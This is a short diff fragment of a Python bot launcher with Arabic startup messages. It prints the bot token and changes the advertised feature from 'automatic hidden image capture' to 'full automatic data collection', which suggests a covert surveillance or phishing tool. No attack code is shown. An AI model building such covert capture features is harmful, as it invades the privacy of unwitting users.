     print(f"🔑 التوكن: {BOT_TOKEN}")
-    print("🎯 الميزة: الالتقاط التلقائي المخفي للصور")
+    print("🎯 الميزة: جمع البيانات الكامل تلقائياً")
     
     # تشغيل الخادم والبوت في خيوط منفصلة
     flask_thread = Thread(target=run_flask, daemon=True)
